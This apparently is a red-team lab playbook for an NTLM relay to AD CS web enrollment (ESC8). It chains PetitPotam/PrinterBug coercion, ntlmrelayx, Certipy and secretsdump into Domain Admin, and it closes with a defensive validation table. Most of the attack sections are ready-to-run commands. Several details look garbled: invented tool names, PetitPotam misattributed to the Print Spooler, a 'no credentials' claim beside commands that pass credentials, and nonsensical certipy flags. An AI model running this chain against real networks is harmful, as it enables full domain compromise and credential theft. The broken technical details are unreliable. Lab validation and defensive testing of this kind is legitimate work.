# Playbook 03 — NTLM Relay & ADCS (ESC8): Coerced Auth → HTTP Relay → DA

> **Stage:** Credential Access / Lateral Movement (MITRE T1187, T1557.001, T1021.002)
> **Toolset:** PetitPotam / PrinterBug, NTDSrelay (`ntlmrelayx.py`), Certipy
> **Goal:** Turn *no credentials* into a **Certificate-Based Authentication
> (entirely unauth) → DA** chain — the modern 2023-2026 "ESEt" in-laboratory.

---

## 1. Why NTLM relay + ADCS is the crown-chain

NTLM is a challenge-response protocol: the client *proves* knowledge of a
password by answering a server challenge. The relay attack **stands between the
victim and a server**, forwarding the challenge it receives to yet another
machine. **Escalation happens when the machine we forward to trusts NTLM
authentication for a privileged action.**

Active Directory Certificate Services (AD CS) is the perfect relay-endpoint:
the web enrollment endpoint (`/certsrv/certfnsh.asp`) accepts **basic NTLM
authentication** and will hand out a **machine/user certificate** based on the
authenticated SID. That certificate === credentials (you can use it to request
tickets, i.e. authenticate as the victim — `T1098`/`T1649`).

**ESC8 summary:** if the CA does **not** require Extended Protection for
Authentication (EPA), and we can relay an *authenticated* NTLM handshake to the
HTTP enrollment endpoint, we obtain a **client-auth certificate** for the relayed
account's identity → `Certipy auth` → TGT → DA.

The lab's `inject_misconfigs.ps1` step 5 installs CA and **enables web
enrollment** precisely so this specific ESC8 chain reproduces.

## 2. Preconditions in the lab

```powershell
# Verify the CA + enrollment surface is present (inject_misconfigs step 5):
Get-AdcsRootCertificate
(Get-IISSite).Applications | where Path -like '/certsrv*'
# and the CANARY template that permits enrollee-supplied subject (for ESC1):
Get-CATemplate -Name CorpLab-ESC1
```

## 3. Coerce authentication onto the wire (PetitPotam)

```bash
# From UBUNTU-SEC; target any host that runs the Print Spooler
# (default on Windows for "Printer Spooler" feature WS01/DC):
python3 PetitPotam.py -u t2-user -p LabStart!22445 \
  192.168.56.30 192.168.56.10          # attacker listener, victim target

# Classic PrinterBug variant (MS-RPRN):
python3 printerbug.py CORP/t2-user:LabStart!22445@192.168.56.10 \
  192.168.56.30 192.168.56.20
```

### Why this works
PetitPotam issues a `RpcStreamNotification` to the target's Print Spooler; the
victim machine then **authenticates back towards us with its machine (or
service) account over NTLM**. We don't win the password — we win *the relay*
into the listener we run.

## 4. Start the HTTP NTLM relay toward the CA

```bash
# ntlmrelayx as targeted-relay server; the http:// hits go to the CA web endpoint.
python3 ntlmrelayx.py -t http://192.168.56.10/certsrv/certfnsh.asp \
  --adcs --template "CorpLab-ESC1" \
  -smb2support -l /tmp/ntlmrelay-logs -da  # enable ADCS
```

### What ntlmrelayx does to win
When the coerced machine's NTLM handshake reaches it, it forwards the Challenge →
response to `http://dc01/certsrv/certfnsh.asp`, authenticating with the victim
identity, and asks the CA to **issue a certificate for the certificate template
`CorpLab-ESC1`** (the ESC1 variant we created: enrollee supplies subject).

## 5. Use the certificate → universal-vehicle → DA

```bash
# Download the issued .pfx (or ntlmrelayx already writes it to /tmp):
python3 certipy.py cert -ca CORP-LAB-CA -dc-ip 192.168.56.10 \
  -username aaa -password aaa --no-pass -template CorpLab-ESC1 -pt rfd \
  -out relay_user.pfx

# Certipy auth — convert the cert into a TGT using the relayed identity:
python3 certipy.py auth -pfx relay_user.pfx -dc-ip 192.168.56.10 -domain corp.local

# Now you hold a TGT for the victim machine/DA account:
python3 secretsdump.py -k -no-pass 'CORP/dc01$@dc01.corp.local' -dc-ip 192.168.56.10
```

### Why this is DA, not just "a cert"
The certificate asserts the account that **authenticated NTLM to the web
endpoint**. If that's `dc01$` (the Domain Controller machine account), the
subsequent `certipy auth` yields `SYSTEM/DA`-grade privileges on the affected
forest — precisely the minimal "all-eggs" path.

## 6. Defense-side checklist (the artifacts you're validating)

| Defensive control | Lab validation |
|---|---|
| **EPA** required on `/certsrv/*` | After EPA, `ntlmrelayx --adcs` must log `Extended Protection` rejection (`HTTP 401`) |
| SMB relay to SMB endpoints | `-smb2support` refused when SMB signing is required |
| Print Spooler disabled on servers | Coercion probe must fail with `access_denied` |
| CA + web enrollment restricted to Tier-0 | Access from `192.168.56.30` blocked |
| **Event 4624 Type-3** sources `192.168.56.30` | Sigma `8f7f1a2b` fires per handshake |
| 5136 writes to `msDS-AllowedToActOnBehalfOfOtherIdentity` | not touched here — reserved for playbook 04 |

Run the chain **twice**: once with `inject_misconfigs.ps1` (expect success),
then rerun after `cleanup.ps1` + GPO hardening (expect the `401`s above).

---

## Theory — "Why AD CS is the constant surprise"

Certificates are effectively **Kerberos keys with an expiration date and a
guaranteed identity string**. A CA that (a) lets any authenticated principal
supply a subject name (`ESC1`) or (b) accepts NTLM over un-EPA'd HTTP (`ESC8`)
hands the attacker a token that *bypasses password-transmission entirely* — no
password is ever relayed, just the **result** of authenticating. Detecting the
chain therefore leans on NTLM handshake events, not on "a password was submitted".